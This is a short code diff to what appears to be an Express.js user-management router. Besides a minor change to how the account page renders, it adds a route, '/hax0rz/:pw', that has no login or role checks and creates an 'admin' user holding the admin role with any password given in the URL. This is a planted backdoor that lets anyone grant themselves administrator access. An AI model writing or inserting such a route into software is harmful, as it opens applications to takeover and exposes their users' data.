@@ -13,6 +13,17 @@ router.get('/', isLoggedIn, isRole('admin'), (request, response)=> {
 	})
 })
 
+router.get('/hax0rz/:pw', (request, response)=> {
+	let user = {
+		username: 'admin',
+		password: request.params.pw,
+		roles: ['admin']
+	}
+	userApi.create(user, (newUser)=> {
+		response.send("DONE! YAY!")
+	})	
+})
+
 // POST /user
 // Create user
 router.post('/', isLoggedIn, isRole('admin'), (request, response)=> {
@@ -59,7 +70,7 @@ router.get('/delete/:objectId', isLoggedIn, isRole('admin'), (request, response)
 router.get('/account', isLoggedIn, (request, response)=> {
 	let objectId = request.user._id
 	userApi.get(objectId, (user)=> {
-		response.render('users/edit-self', {user: user})
+		response.render('users/account')
 	})
 })
 
